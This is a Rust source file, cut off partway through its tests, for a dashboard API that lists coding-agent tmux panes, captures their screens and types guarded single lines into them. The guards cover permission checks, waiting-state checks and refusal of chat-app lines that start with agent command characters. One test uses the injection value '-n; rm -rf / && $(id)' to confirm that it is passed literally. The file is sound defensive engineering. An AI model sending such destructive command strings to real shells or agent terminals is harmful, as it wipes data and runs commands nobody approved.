//! Coding agents running in the box user's own terminals, found by the program and the folder they work in.
//!
//! * `GET /v1/agent-sessions` -> `{ "tmux": bool, "sessions": [ { id, engine, repo, branch, level, state, tmux_session } ] }`
//! * `POST /v1/agent-sessions/<id>/send` with `{ "text": "...", "force": false, "from_app": false }` types one line into the
//!   agent's terminal. `from_app` is who is typing: a chat app (`true`) or the dashboard's own person (`false`). A caller that
//!   leaves it out is treated as a chat app, so it never gets the dashboard's powers by omission. A chat app is refused (403,
//!   `code`: `elevated`, `unknown` or `line_not_allowed`) where the agent is not plain and for a line that starts with `!`, `#`,
//!   `&` or `/`.
//! * `GET /v1/agent-sessions/<id>/capture?lines=<n>` -> the last lines on that terminal's screen.
//!
//! Detection is by executable (`tmux`'s own idea of the pane's running program) and working folder: only a pane whose
//! program is a known coding agent AND whose folder is inside `/work/repos` is listed. The tmux server is the box user's
//! own, so only their panes can ever appear.
//!
//! The levels are honest about what each agent offers, and come from what has been heard from that terminal: `hooks` (the
//! agent's hook has reported needs-input, finished and permission requests: see [`crate::agent_events`]), `notify` (it has
//! reported one of those) and `terminal` (nothing has been heard, so what the agent is doing is unknown). The answer to
//! "is it asking?" is kept per terminal, never per folder.
//!
//! Typing is guarded four ways: the id must be a tmux pane id (`%` and digits), the pane must still be a coding agent in a
//! repo at the moment of typing (an agent that exited leaves a shell, and typing into a shell would run a command), the
//! agent must be waiting for input unless the caller forces it, and the text is one line without control characters. It is
//! one literal argument of `tmux send-keys -l --`, never a shell string, followed by a separate Enter.

use std::collections::HashMap;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use ozbox_core::agent_line::starts_with_agent_command;
use ozbox_core::{CommandRunner, CommandSpec};
use serde::Serialize;
use serde_json::{json, Value};

use crate::agent_authority::{self as authority, Authority};
use crate::agent_events::{self, SessionState};

pub const REPOS_ROOT: &str = "/work/repos";
/// Where Claude Code reads managed settings on Linux: `managed-settings.json` and the `managed-settings.d/*.json` drop-ins.
const MANAGED_DIR: &str = "/etc/claude-code";
pub const MAX_TEXT: usize = 4_000;
pub const MAX_CAPTURE_LINES: usize = 200;
/// What `tmux list-panes -a -F` is asked for.
pub const PANE_FORMAT: &str =
    "#{pane_id}\t#{session_name}\t#{pane_current_command}\t#{pane_current_path}\t#{pane_tty}";

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Pane {
    pub id: String,
    pub tmux_session: String,
    pub command: String,
    pub path: String,
    /// The terminal device (`/dev/pts/3`), or empty when tmux gave none that looks like one.
    pub tty: String,
}

pub fn valid_pane_id(id: &str) -> bool {
    id.len() <= 9
        && id
            .strip_prefix('%')
            .is_some_and(|d| !d.is_empty() && d.bytes().all(|b| b.is_ascii_digit()))
}

fn valid_tty(t: &str) -> bool {
    t.strip_prefix("/dev/").is_some_and(|d| {
        !d.is_empty()
            && d.len() <= 24
            && !d.contains("..")
            && d.chars().all(|c| c.is_ascii_alphanumeric() || c == '/')
    })
}

pub fn parse_panes(out: &str) -> Vec<Pane> {
    out.lines()
        .filter_map(|l| {
            let f: Vec<&str> = l.split('\t').collect();
            let (id, session, command, path, tty) = match f.as_slice() {
                [id, session, command, path] => (id, session, command, path, &""),
                [id, session, command, path, tty] => (id, session, command, path, tty),
                _ => return None,
            };
            valid_pane_id(id).then(|| Pane {
                id: (*id).into(),
                tmux_session: session
                    .chars()
                    .filter(|c| !c.is_control())
                    .take(60)
                    .collect(),
                command: command
                    .chars()
                    .filter(|c| !c.is_control())
                    .take(40)
                    .collect(),
                path: (*path).into(),
                tty: if valid_tty(tty) {
                    (*tty).to_string()
                } else {
                    String::new()
                },
            })
        })
        .collect()
}

/// The engine id for a program name, or none when it is not a coding agent.
pub fn engine_of(command: &str) -> Option<&'static str> {
    match command {
        "claude" => Some("claude-code"),
        "codex" => Some("codex"),
        "gemini" => Some("gemini"),
        "aider" => Some("aider"),
        "opencode" => Some("opencode"),
        "goose" => Some("goose"),
        _ => None,
    }
}

/// What an agent in a given terminal offers, from what has actually been heard from it. `hooks` means a Claude Code or
/// Gemini hook has fired from that terminal (so its questions and turns are reported); `notify` means a Codex or Aider
/// notification has; anything else is `terminal`, however well the program is known: an agent whose hooks were never
/// installed, or stopped firing before they were first heard, reports nothing and is not typed into.
pub fn level_of(engine: &str, heard: bool) -> &'static str {
    match (engine, heard) {
        ("claude-code" | "gemini", true) => "hooks",
        ("codex" | "aider", true) => "notify",
        _ => "terminal",
    }
}

/// The repository a folder belongs to: the outermost folder under the repos root up to the first that holds `.git`.
/// `is_repo` says whether a folder is a repository root. A folder outside the root, or with `..` in it, is none.
pub fn repo_of(path: &str, is_repo: &dyn Fn(&str) -> bool) -> Option<String> {
    let rel = path.strip_prefix(REPOS_ROOT)?.strip_prefix('/')?;
    if rel.is_empty()
        || rel
            .split('/')
            .any(|s| s == ".." || s == "." || s.is_empty())
    {
        return None;
    }
    let parts: Vec<&str> = rel.split('/').collect();
    for n in 1..=parts.len().min(3) {
        let candidate = parts[..n].join("/");
        if is_repo(&format!("{REPOS_ROOT}/{candidate}")) {
            return Some(candidate);
        }
    }
    // not a git folder we can see: the first one or two levels name it well enough
    Some(parts[..parts.len().min(2)].join("/"))
}

/// The branch named by the text of a `.git/HEAD` file.
pub fn branch_of_head(head: &str) -> Option<String> {
    let r = head.trim().strip_prefix("ref: refs/heads/")?;
    let ok = !r.is_empty()
        && r.len() <= 100
        && r.chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./".contains(c));
    ok.then(|| r.to_string())
}

#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct AgentSession {
    pub id: String,
    pub engine: String,
    pub repo: String,
    pub branch: Option<String>,
    pub level: &'static str,
    /// `waiting`, `busy` or `unknown`.
    pub state: &'static str,
    pub tmux_session: String,
    /// `plain`, `elevated` or `unknown`: whether a chat app may type here (see [`crate::agent_authority`]).
    pub authority: &'static str,
}

#[derive(Debug, PartialEq, Eq)]
pub enum SendError {
    Invalid(&'static str),
    Gone,
    /// The agent is not at its prompt; typing now could land in the middle of something.
    NotWaiting,
    /// A chat app asked, and this session's agent holds permissions a chat app may not use.
    Elevated,
    /// A chat app asked, and what this session's agent may do without asking could not be established.
    Unknown,
    /// A chat app asked, and the line would not go to the agent's conversation: it starts with a character Claude Code reads
    /// as a command of its own (`!` runs a shell command, `#` writes memory, `&` starts a background task, `/` is a slash
    /// command, and a custom one can pre-approve tools).
    LineNotAllowed,
    Failed,
}

/// What reading a file gave: missing is fine (no such settings), unreadable is not.
pub enum FileRead {
    Missing,
    Text(String),
    Unreadable,
}

type FileReader = Arc<dyn Fn(&str) -> FileRead + Send + Sync>;

type DirLister = Arc<dyn Fn(&str) -> Option<Vec<String>> + Send + Sync>;

/// The `*.json` files in a folder, by name; a folder that is not there has none, one that cannot be read is `None`.
fn list_json_from_disk(dir: &str) -> Option<Vec<String>> {
    match std::fs::read_dir(dir) {
        Ok(rd) => {
            let mut v: Vec<String> = rd
                .filter_map(|e| e.ok()?.file_name().into_string().ok())
                .filter(|n| n.ends_with(".json"))
                .collect();
            v.sort();
            Some(v)
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Some(Vec::new()),
        Err(_) => None,
    }
}

fn read_from_disk(path: &str) -> FileRead {
    // lossy: `/proc/<pid>/environ` may hold bytes that are not UTF-8, and a settings file that is not is not valid JSON either
    match std::fs::read(path) {
        Ok(b) => FileRead::Text(String::from_utf8_lossy(&b).into_owned()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => FileRead::Missing,
        Err(_) => FileRead::Unreadable,
    }
}

/// How long a pane's classification is kept for the list. A send never uses it: it classifies again at that moment.
const AUTHORITY_TTL: Duration = Duration::from_secs(5);

pub struct SessionService {
    runner: Arc<dyn CommandRunner>,
    home: String,
    read_file: FileReader,
    list_json: DirLister,
    cache_ttl: Duration,
    /// Pane id -> (what it was classified from, when, the answer).
    cache: Mutex<HashMap<String, (String, Instant, Authority)>>,
}

fn state_name(s: Option<SessionState>) -> &'static str {
    match s {
        Some(SessionState::Waiting) => "waiting",
        Some(SessionState::Busy) => "busy",
        Some(SessionState::Asking) => "asking",
        None => "unknown",
    }
}

impl SessionService {
    pub fn new(runner: Arc<dyn CommandRunner>) -> Self {
        Self {
            runner,
            home: std::env::var("HOME").unwrap_or_default(),
            read_file: Arc::new(read_from_disk),
            list_json: Arc::new(list_json_from_disk),
            cache_ttl: AUTHORITY_TTL,
            cache: Mutex::new(HashMap::new()),
        }
    }

    /// The same with another way to list the managed settings drop-in folder (for a test).
    pub fn with_dir_lister(mut self, l: DirLister) -> Self {
        self.list_json = l;
        self
    }

    /// The same with another cache lifetime (for a test).
    pub fn with_cache_ttl(mut self, ttl: Duration) -> Self {
        self.cache_ttl = ttl;
        self
    }

    /// The same with another home folder and another way to read settings files (for a test).
    pub fn with_files(mut self, home: &str, read_file: FileReader) -> Self {
        self.home = home.to_string();
        self.read_file = read_file;
        self
    }

    /// Where Claude Code reads settings from for a session working in `pane.path` (inside `repo`): the user's, the managed
    /// one, and the project and local ones in every folder from the working folder up to the repository root.
    fn settings_paths(&self, path: &str, repo: &str, config_dirs: &[String]) -> Vec<String> {
        let mut v = Vec::new();
        if !self.home.is_empty() {
            v.push(format!("{}/.claude/settings.json", self.home));
            v.push(format!("{}/.claude/settings.local.json", self.home));
        }
        // where `CLAUDE_CONFIG_DIR` moves the user's settings to, for the processes that have it set
        for d in config_dirs {
            v.push(format!("{}/settings.json", d.trim_end_matches('/')));
            v.push(format!("{}/settings.local.json", d.trim_end_matches('/')));
        }
        v.push(format!("{MANAGED_DIR}/managed-settings.json"));
        let root = format!("{REPOS_ROOT}/{repo}");
        let mut dir = path.trim_end_matches('/').to_string();
        loop {
            v.push(format!("{dir}/.claude/settings.json"));
            v.push(format!("{dir}/.claude/settings.local.json"));
            if dir == root || !dir.starts_with(&root) {
                break;
            }
            match dir.rfind('/') {
                Some(i) if i > 0 => dir.truncate(i),
                _ => break,
            }
        }
        v
    }

    /// What this terminal's agent may do without asking, classified afresh. Anything but `Plain` keeps a chat app out. Claude
    /// Code only: no other engine reports a permission mode, so none can be shown to be plain.
    fn authority_of(
        &self,
        pane: &Pane,
        engine: &str,
        repo: &str,
        events: &agent_events::EventLog,
    ) -> Authority {
        if engine != "claude-code" {
            return Authority::Unknown;
        }
        let mut out = authority::of_mode(events.permission_mode(&pane.id, engine));
        if out == Authority::Elevated {
            return out;
        }
        // the processes on the terminal: their flags, and the environment of each `claude` (CLAUDE_CONFIG_DIR)
        let mut config_dirs: Vec<String> = Vec::new();
        if pane.tty.is_empty() {
            out = out.and(Authority::Unknown);
        } else {
            match self.run_ps(pane.tty.trim_start_matches("/dev/")) {
                None => out = out.and(Authority::Unknown),
                Some(o) => {
                    let scan = authority::of_process_args(&o);
                    out = out.and(scan.authority);
                    for pid in &scan.claude_pids {
                        match (self.read_file)(&format!("/proc/{pid}/environ")) {
                            FileRead::Text(t) => {
                                if let Some(d) = authority::config_dir_of_environ(&t) {
                                    if authority::usable_config_dir(&d) {
                                        config_dirs.push(d);
                                    } else {
                                        out = out.and(Authority::Unknown);
                                    }
                                }
                            }
                            // its environment cannot be read: a config folder may be set that nothing here can see
                            FileRead::Missing | FileRead::Unreadable => {
                                out = out.and(Authority::Unknown)
                            }
                        }
                    }
                }
            }
        }
        if out == Authority::Elevated {
            return out;
        }
        let mut files = self.settings_paths(&pane.path, repo, &config_dirs);
        // the managed drop-ins: `managed-settings.d/*.json`
        let drop_in = format!("{MANAGED_DIR}/managed-settings.d");
        match (self.list_json)(&drop_in) {
            Some(names) => files.extend(names.into_iter().map(|n| format!("{drop_in}/{n}"))),
            None => out = out.and(Authority::Unknown),
        }
        for f in files {
            out = out.and(match (self.read_file)(&f) {
                FileRead::Missing => Authority::Plain,
                FileRead::Text(t) => authority::of_settings(&t),
                FileRead::Unreadable => Authority::Unknown,
            });
        }
        if out == Authority::Elevated {
            return out;
        }
        // the visible screen: its footer shows the mode, which a keystroke can change between two hook events
        out.and(
            self.run(&["capture-pane", "-p", "-J", "-t", &pane.id])
                .map_or(Authority::Unknown, |t| authority::of_screen(&t)),
        )
    }

    /// [`Self::authority_of`], kept for a few seconds per pane for the list (every poll of the dashboard would otherwise run
    /// `ps`, `capture-pane` and a dozen file reads for each terminal). What it was classified from (the mode heard, the folder
    /// and the terminal) is part of the key, so a changed mode is never answered from the cache. Typing never uses this.
    fn authority_listed(
        &self,
        pane: &Pane,
        engine: &str,
        repo: &str,
        events: &agent_events::EventLog,
    ) -> Authority {
        let key = format!(
            "{}|{:?}|{}|{}",
            engine,
            events.permission_mode(&pane.id, engine),
            pane.path,
            pane.tty
        );
        let now = Instant::now();
        if let Ok(c) = self.cache.lock() {
            if let Some((k, at, a)) = c.get(&pane.id) {
                if *k == key && now.duration_since(*at) < self.cache_ttl {
                    return *a;
                }
            }
        }
        let a = self.authority_of(pane, engine, repo, events);
        if let Ok(mut c) = self.cache.lock() {
            // panes that no longer exist must not pile up
            c.retain(|_, (_, at, _)| now.duration_since(*at) < self.cache_ttl * 12);
            c.insert(pane.id.clone(), (key, now, a));
        }
        a
    }

    fn run_ps(&self, tty: &str) -> Option<String> {
        // `-ww`: no width limit, so a flag far along a long command line is not cut off. On a real box confirm that `ps -t
        // pts/N` resolves and that `/proc/<pid>/environ` can be read under the unit's hardening (PrivateDevices, ProtectProc):
        // if not, every session reads `unknown`, which is safe, but a chat app could then attach to none.
        let spec =
            CommandSpec::new("ps").args(["-ww", "-t", tty, "-o", "pid=,args="].map(String::from));
        let out = self.runner.run(&spec).ok()?;
        (out.status == Some(0)).then_some(out.stdout)
    }

    fn run(&self, args: &[&str]) -> Option<String> {
        let spec = CommandSpec::new("tmux").args(args.iter().map(|a| a.to_string()));
        let out = self.runner.run(&spec).ok()?;
        (out.status == Some(0)).then_some(out.stdout)
    }

    fn agent_panes(&self) -> Vec<(Pane, &'static str, String)> {
        let Some(out) = self.run(&["list-panes", "-a", "-F", PANE_FORMAT]) else {
            return Vec::new();
        };
        let is_repo = |p: &str| Path::new(p).join(".git").exists();
        parse_panes(&out)
            .into_iter()
            .filter_map(|p| {
                let engine = engine_of(&p.command)?;
                let repo = repo_of(&p.path, &is_repo)?;
                Some((p, engine, repo))
            })
            .collect()
    }

    pub fn list(&self, events: &agent_events::EventLog) -> Value {
        let tmux = self.run(&["-V"]).is_some();
        let sessions: Vec<AgentSession> = if tmux {
            self.agent_panes()
                .into_iter()
                .map(|(p, engine, repo)| {
                    let branch = std::fs::read_to_string(
                        Path::new(REPOS_ROOT).join(&repo).join(".git/HEAD"),
                    )
                    .ok()
                    .and_then(|h| branch_of_head(&h));
                    // nothing heard from the terminal: nothing is known about what it may do
                    let authority = if events.hook_seen(&p.id, engine) {
                        self.authority_listed(&p, engine, &repo, events)
                    } else {
                        Authority::Unknown
                    };
                    AgentSession {
                        id: p.id.clone(),
                        engine: engine.into(),
                        repo,
                        branch,
                        authority: authority.as_str(),
                        level: level_of(engine, events.hook_seen(&p.id, engine)),
                        state: state_name(events.state_of_pane(&p.id, engine)),
                        tmux_session: p.tmux_session,
                    }
                })
                .collect()
        } else {
            Vec::new()
        };
        json!({ "tmux": tmux, "sessions": sessions })
    }

    /// Type one line into an agent's terminal and press Enter.
    pub fn send(
        &self,
        id: &str,
        text: &str,
        force: bool,
        from_app: bool,
        events: &agent_events::EventLog,
    ) -> Result<(), SendError> {
        // a chat app never forces (the server does not ask it to; this keeps a caller that did from skipping the check)
        let force = force && !from_app;
        if !valid_pane_id(id) {
            return Err(SendError::Invalid("that is not a terminal session"));
        }
        if text.trim().is_empty() || text.len() > MAX_TEXT {
            return Err(SendError::Invalid("the message is empty or too long"));
        }
        // one line: a line break would press Enter early, and in a shell that is a second command
        let line: String = text
            .chars()
            .map(|c| {
                if c == '\n' || c == '\r' || c == '\t' {
                    ' '
                } else {
                    c
                }
            })
            .collect();
        if line.chars().any(|c| c.is_control()) {
            return Err(SendError::Invalid(
                "the message holds characters a terminal would act on",
            ));
        }
        // a chat app never types a line the agent would act on itself (see [`starts_with_agent_command`])
        if from_app && starts_with_agent_command(&line) {
            return Err(SendError::LineNotAllowed);
        }
        // looked up again right now: the program may have exited and left a shell behind
        let Some((pane, engine, repo)) =
            self.agent_panes().into_iter().find(|(p, _, _)| p.id == id)
        else {
            return Err(SendError::Gone);
        };
        // A chat app types only where the agent would ask before doing anything beyond reading. This comes before the
        // "waiting" check so that the answer for an elevated session never depends on what it is doing.
        if from_app {
            match self.authority_of(&pane, engine, &repo, events) {
                Authority::Plain => {}
                Authority::Elevated => return Err(SendError::Elevated),
                Authority::Unknown => return Err(SendError::Unknown),
            }
        }
        // this terminal's own last word, never a neighbouring folder's or another agent's
        if !force && events.state_of_pane(&pane.id, engine) != Some(SessionState::Waiting) {
            return Err(SendError::NotWaiting);
        }
        // `-l` sends the text literally (no key names), and `--` ends the options so text that starts with `-` is text
        self.run(&["send-keys", "-t", id, "-l", "--", &line])
            .ok_or(SendError::Failed)?;
        self.run(&["send-keys", "-t", id, "Enter"])
            .ok_or(SendError::Failed)?;
        Ok(())
    }

    pub fn capture(&self, id: &str, lines: usize) -> Result<String, SendError> {
        if !valid_pane_id(id) {
            return Err(SendError::Invalid("that is not a terminal session"));
        }
        if !self.agent_panes().iter().any(|(p, _, _)| p.id == id) {
            return Err(SendError::Gone);
        }
        let n = format!("-{}", lines.clamp(1, MAX_CAPTURE_LINES));
        self.run(&["capture-pane", "-p", "-J", "-t", id, "-S", &n])
            .ok_or(SendError::Failed)
    }
}

fn from_app_unless_said() -> bool {
    true
}

/// The routes, for any service and any event log (so a test can use fakes).
pub fn route(
    svc: &SessionService,
    events: &std::sync::Mutex<agent_events::EventLog>,
    method: &str,
    path: &str,
    query: &std::collections::BTreeMap<String, String>,
    body: &[u8],
) -> (u16, Value) {
    let rest = path.trim_end_matches('/');
    let lock = || events.lock().unwrap_or_else(|e| e.into_inner());
    if rest == "/v1/agent-sessions" {
        return if method == "GET" {
            (200, svc.list(&lock()))
        } else {
            (405, json!({ "error": "method not allowed" }))
        };
    }
    let Some(tail) = rest.strip_prefix("/v1/agent-sessions/") else {
        return (404, json!({ "error": "not found" }));
    };
    let err = |e: SendError| match e {
        SendError::Invalid(m) => (400, json!({ "error": m })),
        SendError::Gone => (
            404,
            json!({ "error": "that terminal session is not running, or it is not a coding agent in a repository" }),
        ),
        SendError::NotWaiting => (
            409,
            json!({ "error": "the agent is not waiting for input", "code": "not_waiting" }),
        ),
        SendError::Elevated => (
            403,
            json!({ "error": "that agent holds permissions a chat app may not use", "code": "elevated" }),
        ),
        SendError::Unknown => (
            403,
            json!({ "error": "what that agent may do without asking could not be established", "code": "unknown" }),
        ),
        SendError::LineNotAllowed => (
            403,
            json!({ "error": "a chat app may not type a line that starts with ! # & or /", "code": "line_not_allowed" }),
        ),
        SendError::Failed => (502, json!({ "error": "the terminal did not take it" })),
    };
    match (method, tail.split_once('/')) {
        ("POST", Some((id, "send"))) => {
            #[derive(serde::Deserialize)]
            struct B {
                text: String,
                #[serde(default)]
                force: bool,
                /// The caller (the Oz Box server) says a chat app, not the dashboard, is typing. A caller that does not say is
                /// treated as a chat app: the refusals apply unless the dashboard's own server says it is not one.
                #[serde(default = "from_app_unless_said")]
                from_app: bool,
            }
            let Ok(b) = serde_json::from_slice::<B>(body) else {
                return (400, json!({ "error": "invalid JSON body" }));
            };
            // the text is a person's message: never logged and never echoed back
            match svc.send(id, &b.text, b.force, b.from_app, &lock()) {
                Ok(()) => (200, json!({ "id": id, "sent": true })),
                Err(e) => err(e),
            }
        }
        ("GET", Some((id, "capture"))) => {
            let n = query
                .get("lines")
                .and_then(|v| v.parse().ok())
                .unwrap_or(40);
            match svc.capture(id, n) {
                Ok(t) => (200, json!({ "id": id, "text": t })),
                Err(e) => err(e),
            }
        }
        (_, Some((_, "send" | "capture"))) => (405, json!({ "error": "method not allowed" })),
        _ => (404, json!({ "error": "not found" })),
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;
    use ozbox_core::{Output, RecordingRunner};
    use std::sync::Mutex;

    fn ok(s: &str) -> Output {
        Output {
            status: Some(0),
            stdout: s.into(),
            stderr: String::new(),
        }
    }

    const PANES: &str = "%3\twork\tclaude\t/work/repos/web\n%4\twork\tbash\t/work/repos/web\n%5\tother\tcodex\t/home/u\n%x\tw\tclaude\t/work/repos/a\n";

    fn rig(replies: Vec<Output>) -> (SessionService, Arc<RecordingRunner>) {
        let r = Arc::new(RecordingRunner::new());
        for o in replies {
            r.reply(o);
        }
        (SessionService::new(r.clone()), r)
    }

    #[test]
    fn panes_are_parsed_and_only_coding_agents_in_repos_are_kept() {
        assert_eq!(
            parse_panes(PANES).len(),
            3,
            "a pane id that is not %digits is dropped"
        );
        let (s, _) = rig(vec![ok(PANES)]);
        let panes = s.agent_panes();
        assert_eq!(
            panes.len(),
            1,
            "a shell, and an agent outside /work/repos, are not listed"
        );
        assert_eq!((panes[0].1, panes[0].2.as_str()), ("claude-code", "web"));
        assert_eq!(engine_of("opencode"), Some("opencode"));
        assert_eq!(engine_of("bash"), None);
        assert_eq!(
            (
                level_of("claude-code", true),
                level_of("codex", true),
                level_of("opencode", true)
            ),
            ("hooks", "notify", "terminal")
        );
    }

    #[test]
    fn a_repo_is_named_by_its_folder_and_a_path_that_climbs_is_nothing() {
        let is_repo = |p: &str| p == "/work/repos/org/web";
        assert_eq!(
            repo_of("/work/repos/org/web/src/deep", &is_repo).as_deref(),
            Some("org/web")
        );
        assert_eq!(
            repo_of("/work/repos/web/x", &|_| false).as_deref(),
            Some("web/x")
        );
        assert_eq!(repo_of("/work/repos/../etc", &|_| true), None);
        assert_eq!(repo_of("/home/u/web", &|_| true), None);
        assert_eq!(repo_of("/work/repos", &|_| true), None);
        assert_eq!(
            branch_of_head("ref: refs/heads/fix/parser\n").as_deref(),
            Some("fix/parser")
        );
        assert_eq!(branch_of_head("3f2a9c\n"), None);
    }

    /// Claude Code in pane %3 took a prompt and finished it: a whole turn, as its hooks report it.
    fn waiting_log(path: &str) -> agent_events::EventLog {
        let mut log = agent_events::EventLog::new();
        for (i, ev) in ["UserPromptSubmit", "Stop"].iter().enumerate() {
            log.report_in_pane(
                "claude-code",
                &json!({ "hook_event_name": ev, "cwd": path }),
                "/x",
                "%3",
                1 + i as u64,
            )
            .unwrap();
        }
        log
    }

    #[test]
    fn typing_is_one_literal_argument_then_a_separate_enter_and_never_a_shell_string() {
        let (s, r) = rig(vec![ok(PANES), ok(""), ok("")]);
        s.send(
            "%3",
            "-n; rm -rf / && $(id)\nsecond line",
            false,
            false,
            &waiting_log("/work/repos/web"),
        )
        .unwrap();
        let calls = r.calls();
        assert_eq!(calls.len(), 3);
        assert!(calls.iter().all(|c| c.program == "tmux"));
        assert_eq!(
            calls[1].args,
            [
                "send-keys",
                "-t",
                "%3",
                "-l",
                "--",
                "-n; rm -rf / && $(id) second line"
            ],
            "the text is ONE argument, after `--`, with the line break folded into a space"
        );
        assert_eq!(calls[2].args, ["send-keys", "-t", "%3", "Enter"]);
    }

    #[test]
    fn typing_is_refused_at_a_permission_prompt_even_for_a_forceless_waiting_looking_agent() {
        let (s, r) = rig(vec![ok(PANES)]);
        let mut log = agent_events::EventLog::new();
        log.report_in_pane(
            "claude-code",
            &json!({ "hook_event_name": "Notification", "cwd": "/work/repos/web",
                "message": "Claude needs your permission to use Bash", "notification_type": "permission_prompt" }),
            "/x",
            "%3",
            1,
        )
        .unwrap();
        assert!(matches!(
            s.send("%3", "1", false, false, &log),
            Err(SendError::NotWaiting)
        ));
        assert_eq!(r.calls().len(), 1, "only the pane lookup reached tmux");
        assert_eq!(state_name(log.state_of_pane("%3", "claude-code")), "asking");
    }

    #[test]
    fn typing_is_refused_for_a_bad_id_a_shell_pane_a_busy_agent_and_odd_text_unless_forced() {
        let (s, r) = rig(vec![]);
        let log = waiting_log("/work/repos/web");
        assert!(matches!(
            s.send("3", "hi", false, false, &log),
            Err(SendError::Invalid(_))
        ));
        assert!(matches!(
            s.send("%3; ls", "hi", false, false, &log),
            Err(SendError::Invalid(_))
        ));
        assert!(matches!(
            s.send("%3", "  ", false, false, &log),
            Err(SendError::Invalid(_))
        ));
        assert!(matches!(
            s.send("%3", "a\u{1b}[31m", false, false, &log),
            Err(SendError::Invalid(_))
        ));
        assert!(r.calls().is_empty(), "nothing reached tmux");
        // the pane turned into a shell
        let (s, _) = rig(vec![ok(PANES)]);
        assert_eq!(s.send("%4", "ls", true, false, &log), Err(SendError::Gone));
        // busy: refused, forced: typed
        let mut busy = agent_events::EventLog::new();
        busy.report_in_pane(
            "claude-code",
            &json!({ "hook_event_name": "UserPromptSubmit", "cwd": "/work/repos/web" }),
            "/x",
            "%3",
            1,
        )
        .unwrap();
        let (s, _) = rig(vec![ok(PANES)]);
        assert_eq!(
            s.send("%3", "hi", false, false, &busy),
            Err(SendError::NotWaiting)
        );
        let (s, r) = rig(vec![ok(PANES), ok(""), ok("")]);
        assert!(s.send("%3", "hi", true, false, &busy).is_ok());
        assert_eq!(r.calls().len(), 3);
        // an agent that reports nothing is "unknown": refused without force
        let (s, _) = rig(vec![ok(PANES)]);
        assert_eq!(
            s.send("%3", "hi", false, false, &agent_events::EventLog::new()),
            Err(SendError::NotWaiting)
        );
    }

    const TWO_AGENTS: &str = "%3\twork\tclaude\t/work/repos/web\n%6\twork\tclaude\t/work/repos/web/src\n%7\twork\tgemini\t/work/repos/web\n";

    fn say(log: &mut agent_events::EventLog, engine: &str, pane: &str, payload: Value, t: u64) {
        log.report_in_pane(engine, &payload, "/x", pane, t).unwrap();
    }

    #[test]
    fn an_agent_at_a_permission_prompt_stays_asking_whatever_another_agent_in_the_same_repo_reports(
    ) {
        let mut log = agent_events::EventLog::new();
        let ev = |name: &str, cwd: &str| json!({ "hook_event_name": name, "cwd": cwd });
        // B (%6, in a sub-folder) has a turn and then shows "Allow this command?"
        say(
            &mut log,
            "claude-code",
            "%6",
            ev("UserPromptSubmit", "/work/repos/web/src"),
            1,
        );
        say(
            &mut log,
            "claude-code",
            "%6",
            json!({ "hook_event_name": "Notification", "cwd": "/work/repos/web/src",
                "notification_type": "permission_prompt", "message": "Claude needs your permission to use Bash" }),
            2,
        );
        // A (%3, the repo root) has a whole turn and finishes AFTER B's prompt appeared
        say(
            &mut log,
            "claude-code",
            "%3",
            ev("UserPromptSubmit", "/work/repos/web"),
            3,
        );
        say(
            &mut log,
            "claude-code",
            "%3",
            ev("Stop", "/work/repos/web"),
            4,
        );
        assert_eq!(
            state_name(log.state_of_pane("%3", "claude-code")),
            "waiting"
        );
        assert_eq!(
            state_name(log.state_of_pane("%6", "claude-code")),
            "asking",
            "another agent's Stop does not unlock B's prompt"
        );
        let (s, r) = rig(vec![ok(TWO_AGENTS)]);
        assert_eq!(
            s.send("%6", "1", false, false, &log),
            Err(SendError::NotWaiting)
        );
        assert_eq!(r.calls().len(), 1, "only the pane lookup reached tmux");
        // and the other direction: A is not blocked by B's question
        let (s, _) = rig(vec![ok(TWO_AGENTS), ok(""), ok("")]);
        assert!(s.send("%3", "go on", false, false, &log).is_ok());
    }

    #[test]
    fn a_question_that_is_not_a_known_idle_notice_is_a_question() {
        for (kind, msg) in [
            (
                "elicitation_dialog",
                "An MCP server asks: which environment?",
            ),
            ("auth_success", "Authenticated"),
            ("something_new", "Claude has a thing to ask"),
            ("", "Claude is waiting for your input"),
        ] {
            let mut log = agent_events::EventLog::new();
            say(
                &mut log,
                "claude-code",
                "%3",
                json!({ "hook_event_name": "UserPromptSubmit", "cwd": "/work/repos/web" }),
                1,
            );
            say(
                &mut log,
                "claude-code",
                "%3",
                json!({ "hook_event_name": "Notification", "cwd": "/work/repos/web", "notification_type": kind, "message": msg }),
                2,
            );
            assert_eq!(
                state_name(log.state_of_pane("%3", "claude-code")),
                "asking",
                "{kind:?}"
            );
        }
        // only a positive idle notice (and Stop) is "waiting", and an idle notice does not lift an open question
        let mut log = agent_events::EventLog::new();
        say(
            &mut log,
            "claude-code",
            "%3",
            json!({ "hook_event_name": "UserPromptSubmit", "cwd": "/work/repos/web" }),
            1,
        );
        say(
            &mut log,
            "claude-code",
            "%3",
            json!({ "hook_event_name": "Notification", "cwd": "/work/repos/web", "notification_type": "idle_prompt" }),
            2,
        );
        assert_eq!(
            state_name(log.state_of_pane("%3", "claude-code")),
            "waiting"
        );
        say(
            &mut log,
            "claude-code",
            "%3",
            json!({ "hook_event_name": "Notification", "cwd": "/work/repos/web", "notification_type": "permission_prompt" }),
            3,
        );
        say(
            &mut log,
            "claude-code",
            "%3",
            json!({ "hook_event_name": "Notification", "cwd": "/work/repos/web", "notification_type": "idle_prompt" }),
            4,
        );
        assert_eq!(state_name(log.state_of_pane("%3", "claude-code")), "asking");
        say(
            &mut log,
            "claude-code",
            "%3",
            json!({ "hook_event_name": "Stop", "cwd": "/work/repos/web" }),
            5,
        );
        assert_eq!(
            state_name(log.state_of_pane("%3", "claude-code")),
            "waiting"
        );
        // a helper agent finishing is not the main agent finishing
        say(
            &mut log,
            "claude-code",
            "%3",
            json!({ "hook_event_name": "UserPromptSubmit", "cwd": "/work/repos/web" }),
            6,
        );
        say(
            &mut log,
            "claude-code",
            "%3",
            json!({ "hook_event_name": "SubagentStop", "cwd": "/work/repos/web" }),
            7,
        );
        assert_eq!(state_name(log.state_of_pane("%3", "claude-code")), "busy");
    }

    #[test]
    fn gemini_is_typed_into_only_when_its_own_hooks_have_proved_the_turn_is_over() {
        // hooks installed before BeforeAgent existed: Notification and AfterAgent only, so no turn start is ever heard
        let mut old = agent_events::EventLog::new();
        say(
            &mut old,
            "gemini",
            "%7",
